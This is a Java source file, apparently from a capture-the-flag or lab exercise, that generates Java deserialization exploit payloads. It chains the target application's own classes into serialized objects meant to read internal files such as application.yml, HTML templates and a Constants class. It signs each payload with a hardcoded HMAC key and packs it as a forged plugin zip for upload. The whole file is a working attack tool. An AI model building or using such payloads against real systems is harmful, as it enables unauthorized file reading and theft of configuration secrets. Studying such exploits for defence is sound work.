import com.agent.update.deserialization.*;
import java.io.*;
import java.nio.file.*;
import java.util.zip.*;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.util.Base64;

public class ReadConfig {
    static String[] PATHS = {
        "/app/BOOT-INF/classes/application.yml",
        "/app/BOOT-INF/classes/templates/upload.html",
        "/app/BOOT-INF/classes/templates/index.html",
        "/app/BOOT-INF/classes/templates/plugins.html",
        "/app/BOOT-INF/classes/templates/logs.html",
        "/app/BOOT-INF/classes/templates/chat.html",
        "/app/BOOT-INF/classes/templates/my-plugins.html",
        "/app/BOOT-INF/classes/static/upload.html",
        "/app/BOOT-INF/classes/com/agent/update/utils/Constants.class",
    };
    public static void main(String[] args) throws Exception {
        for (String path : PATHS) {
            String safe = path.replace("/", "_").replace(".", "_").substring(0, Math.min(35, path.length()));
            FileExporter e = new FileExporter(); e.setTeamId("admin");
            DataStream ds = new DataStream(); ds.setExporter(e);
            ResourceRefresher rr = new ResourceRefresher(); rr.setTargetPath(path); rr.setDataStream(ds);
            Path ser = Paths.get("rc_" + safe + ".ser");
            try (FileOutputStream fo = new FileOutputStream(ser.toFile()); ObjectOutputStream oo = new ObjectOutputStream(fo)) { oo.writeObject(rr); }
            byte[] sd = Files.readAllBytes(ser);
            Mac mac = Mac.getInstance("HmacSHA256"); mac.init(new SecretKeySpec("k3y_5A62_X86".getBytes(), "HmacSHA256"));
            String sig = Base64.getEncoder().encodeToString(mac.doFinal(sd));
            String mf = "{\"pluginName\":\"rc\",\"version\":\"1.0\",\"hmacSignature\":\"" + sig + "\"}";
            Path zp = Paths.get("rc_" + safe + ".zip");
            try (ZipOutputStream zo = new ZipOutputStream(new FileOutputStream(zp.toFile()))) {
                zo.putNextEntry(new ZipEntry("manifest.json")); zo.write(mf.getBytes()); zo.closeEntry();
                zo.putNextEntry(new ZipEntry("metadata.ser")); zo.write(sd); zo.closeEntry();
            }
            System.out.println("OK: " + zp);
        }
    }
}
